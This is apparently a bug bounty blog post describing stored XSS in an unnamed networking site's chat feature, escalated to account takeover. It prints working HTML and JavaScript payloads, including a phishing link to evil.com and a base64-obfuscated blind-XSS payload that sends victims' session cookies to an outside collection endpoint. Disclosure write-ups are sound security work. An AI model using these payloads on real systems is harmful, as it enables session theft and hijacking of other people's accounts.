Let me take you on an exciting journey of how I uncovered a massive security flaw in a professional networking platform, similar to LinkedIn, and turned harmless chat messages into a **devastating account takeover exploit**! üò±

## ü§î The Discovery: A Glimpse of Opportunity

I stumbled upon **redacted.com**, a **big-name and famous company** in the networking space. It offered features like:

* Professional profile creation
* Posting updates
* Connecting with others
* And surprisingly, **messaging anyone**, even if you weren‚Äôt connected!

This was unlike LinkedIn, where messaging is restricted unless you‚Äôre connected or a premium member. My hacker instincts tingled! Was there a flaw in this ‚Äúopen‚Äù messaging system? Time to find out! üòè

## üîç Setting the Stage: Two Accounts, One Experiment

To test the waters, I created two accounts:

* **Account 1 (Attacker)**: My hacker persona.
* **Account 2 (Victim)**: The target for my experiments.

I began testing the platform‚Äôs chat system by sending **basic HTML payloads** from Account 1 to Account 2. Here are a few examples:

1. **Image injection**

```
<img src="https://example.com/hacker.jpg">
```

**2 .Phishing link**

```
<a href="https://evil.com" style="color: red; font-size: 20px;">Click here to win $25!</a>
```

1. **Iframe injection**

```
"><iframe src="https://www.cia.gov" style="border:0; width:100%; height:100%;"></iframe>
```

**Result?** üéâ Everything worked! The platform rendered my raw HTML payloads without sanitizing them. This was **critical** because it meant the system wasn‚Äôt protecting against malicious inputs.

## üî• Escalation: Stored XSS in the Chat System

Next, I decided to test for **stored XSS**. Stored XSS occurs when malicious scripts are saved on the server and executed whenever a user interacts with the vulnerable page.

Here‚Äôs the payload I tried:

```
<img src/onerror=prompt(document.cookie)>
```

Here‚Äôs what happened:

* When **Account 2** opened the chat, the payload executed, triggering a pop-up showing the victim‚Äôs cookies. üç™
* Even **Account 1** (the sender) would see the XSS pop-up upon revisiting the chat.

This confirmed the presence of a **stored XSS vulnerability** in the chat system. But I wasn‚Äôt going to stop here. The real goal? **Full account takeover.**

## üí£ The Big Bang: Blind XSS for Account Takeover

I crafted a **blind XSS payload** to escalate the attack. This payload would steal the victim‚Äôs session cookies and send them to my server for exploitation. Here‚Äôs what I used:

```
"><img src=x id=dmFyIGE9ZG9jdW1k7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2xvcmRvZmhlYXZlbjEyMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
```

### How It Played Out:

1. I sent the payload from **Account 1** to **Account 2** via chat.
2. When **Account 2** opened the chat, the payload executed in their browser.
3. The payload sent **Account 2‚Äôs session cookies** to my endpoint on **xss.report**.
4. Using those cookies, I logged into **Account 2** without needing their credentials.

**BOOM! üí• Account takeover achieved.**

## üò® The Real Impact

This vulnerability was catastrophic. An attacker could:

* Hijack any user‚Äôs account by simply sending them a malicious chat message.
* Automate the attack to compromise thousands of accounts in minutes.

Platforms like **redacted.com** are trusted by professionals, and such a flaw could seriously harm their reputation.

## üìß Reporting the Bug

I discovered and reported this vulnerability **over six months ago** to **redacted.com** . I even followed up via email. Unfortunately, I never received any response.

As a bug bounty hunter, I value platforms that take security seriously. However, the lack of action here left me disappointed. I decided to share my findings through this article to **help the community learn** and to emphasize the importance of addressing security issues promptly.

## üåü Final Thoughts

This was my first Medium article, and I hope you found it insightful! üôå

Discovering and exploiting vulnerabilities like these remind us how small oversights can lead to significant security risks. Let me know your thoughts in the comments, and feel free to share any similar experiences you‚Äôve had!

Would love your feedback, especially since this is my first-ever article! üòä
